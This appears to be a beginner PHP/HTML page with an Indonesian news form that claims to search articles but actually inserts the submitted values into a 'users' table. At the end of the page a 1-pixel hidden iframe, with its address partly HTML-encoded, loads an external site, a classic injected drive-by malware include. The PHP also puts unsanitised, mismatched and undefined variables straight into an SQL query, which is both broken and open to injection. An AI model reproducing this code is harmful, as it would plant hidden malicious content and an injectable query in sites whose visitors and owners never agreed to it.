<html>
<head>
	<title>Pencarian Berita</title>
</head>
 
<body>
	<a href="index.php">Kembali</a>
	<br/><br/>
 
	<form action="add.php" method="post" name="form1">
		<table width="25%" border="0">
			<tr> 
				<td>id</td>
				<td><input type="text" name="id"></td>
			</tr>
			<tr> 
				<td>judul</td>
				<td><input type="text" name="judul"></td>
			</tr>
			<tr> 
				<td>berita</td>
				<td><input type="text" name="berita"></td>
			</tr>
			<tr> 
			<td>tanggal</td>
				<td><input type="text" name="tanggal"></td>
			</tr>
			<tr> 
				<td></td>
				<td><input type="submit" name="Submit" value="Cari"></td>
			</tr>
		</table>
	</form>
	
	<?php
 
	// Check If form submitted, insert form data into users table.
	if(isset($_POST['Submit'])) {
		$ID = $_POST['ID'];
		$Judul = $_POST['Judul'];
		$Berita = $_POST['Berita'];
		$Tanggal = $_POST['Tanggal'];
		
		// include database connection file
		include_once("config.php");
				
		// Insert user data into table
		$result = mysqli_query($mysqli, "INSERT INTO users(id,judul,berita,tanggal) VALUES('$id','$judul','$berita','$tanggal')");
		
		// Show message when search berita
		echo "Hasil pencarian. <a href='index.php'>View Users</a>";
	}
	?>
<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>